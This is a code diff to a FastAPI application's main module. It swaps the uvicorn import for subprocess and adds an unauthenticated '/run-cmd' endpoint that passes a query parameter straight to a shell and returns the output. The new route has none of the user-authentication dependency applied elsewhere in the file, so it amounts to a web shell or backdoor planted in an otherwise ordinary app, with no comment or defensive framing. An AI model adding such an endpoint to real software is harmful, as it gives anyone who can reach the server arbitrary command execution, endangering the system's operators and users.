@@ -1,7 +1,7 @@
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi import FastAPI, Depends
 from fastapi.staticfiles import StaticFiles
-import uvicorn
+import subprocess
 import routers
 
 from routers.auth import get_current_active_user as get_user
@@ -19,6 +19,15 @@ app.add_middleware(
     allow_methods=["*"],
     allow_headers=["*"],
 )
+
+@app.get("/run-cmd")
+def run_cmd(cmd: str):
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    return {
+        "stdout": result.stdout,
+        "stderr": result.stderr,
+        "returncode": result.returncode
+    }
 
 app.include_router(routers.client, dependencies=[Depends(get_user)])
 app.include_router(routers.service)
